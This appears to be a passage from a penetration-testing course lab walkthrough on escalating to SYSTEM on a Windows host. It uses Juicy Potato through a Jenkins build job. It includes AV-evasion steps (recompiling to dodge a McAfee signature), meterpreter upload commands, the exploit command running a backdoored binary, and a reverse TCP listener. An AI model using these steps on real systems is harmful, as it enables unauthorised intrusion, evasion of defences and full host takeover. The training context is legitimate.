The Juicy Potato source code can be found on the github page: https://github.com/ohpe/juicypotato. Juicy Potato was written, and can be compiled with, Visual Studio. 

After a review of the code, we do not find anything that raises concerns, so we can deem this exploit to be safe to run
against our target.

***
While the Juicy Potato binary can be downloaded directly from the GitHub page, we recommend that students get used to compiling their own binary files after a review of the source code, as a good and more safe practice.

In this case, the publicly available binary file is easily detected as malicious by the McAfee AV solution that is used in the lab. Therefore, we first needed to identify the offending bytes and verify that we can bypass detection with our modifications. 

Using the file-splitting technique with the help of a slightly modified Python script,749 we realized that the AV signature was based on the
embedded string that contained the path to the generated PDB file. As this is an artifact of the compilation process, the evasion was rather simple: we simply compiled the JuicyPotato source code without the /DEBUG flag. 

This was sufficient to bypass the McAfee detection, so we will use the binary that we compiled, which can be found on your Windows 10 PWK client VM in the labs. If you have access to Visual Studio, you could attempt to compile the exploit yourself.
***

Once JuicyPotato.exe is transferred to our Kali machine, we can use our existing meterpreter shell to upload it to Cevapi:
C:\Program Files (x86)\Jenkins\workspace\Access>`exit`

meterpreter > `upload /home/kali/cevapi/JuicyPotato.exe c:/Users/Public/JuicyPotato.exe`
```
[*] uploading : /home/kali/cevapi/JuicyPotato.exe -> c:/Users/Public/JuicyPotato.exe
[*] Uploaded 339.50 KiB (100.0%): /home/kali/cevapi/JuicyPotato.exe ->
c:/Users/Public/JuicyPotato.exe
[*] uploaded : /home/kali/cevapi/JuicyPotato.exe -> c:/Users/Public/JuicyPotato.exe
```

Before we run JuicyPotato.exe, there are some mandatory arguments mentioned in the documentation:
**-t** Process creation mode. We need "CreateProcessWithToken" if we have "SeImpersonate" priv, which we do. value is "t".
**-p** Specifies program we are running, in this case the backdoored whoami.exe binary we used previously.
**-l** Specify an arbitrary port for the COM server to listen on.

Final command we will place into the Jenkins server:
`C:\Users\Public\JuicyPotato.exe -t t -p C:\Users\Public\whoami.exe -l 5837`

Background the meterpreter session and start a new listener:
C:\Program Files>`exit`
exit
meterpreter > `background`
\[\*] Backgrounding session 1...
msf5 exploit(multi/handler) >`run`
\[\*] Started reverse TCP handler on 10.11.0.4:80

Finally, edit the Item Config in Jenkins to run the Juicy Potato command. 
We must also check the "Execute concurrent builds if neccessary" box to allow us to run both old and new builds at the same time. 

This isn't strictly neccessary, but will give a fallback to the low-priv shell if needed.

Save config and Build Now. Interestingly, the build will show as failed but if we watch msfconsole we will obtain a SYSTEM shell:
meterpreter > `shell`
...
C:\Windows\system32>`whoami`
whoami
nt authority\system
